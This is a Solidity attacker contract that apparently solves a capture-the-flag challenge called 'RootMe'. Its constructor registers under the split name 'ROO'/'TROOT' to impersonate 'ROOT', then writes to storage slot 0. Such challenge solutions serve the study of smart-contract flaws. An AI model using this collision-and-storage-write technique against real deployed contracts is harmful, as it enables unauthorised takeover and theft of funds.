// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

import "../ChallengeRootMe.sol";

contract ChallengeRootMeAttacker {
    constructor(address target) {
        RootMe challenge = RootMe(target);
        challenge.register("ROO", "TROOT");
        challenge.write(0, bytes32(uint256(1)));
    }
}
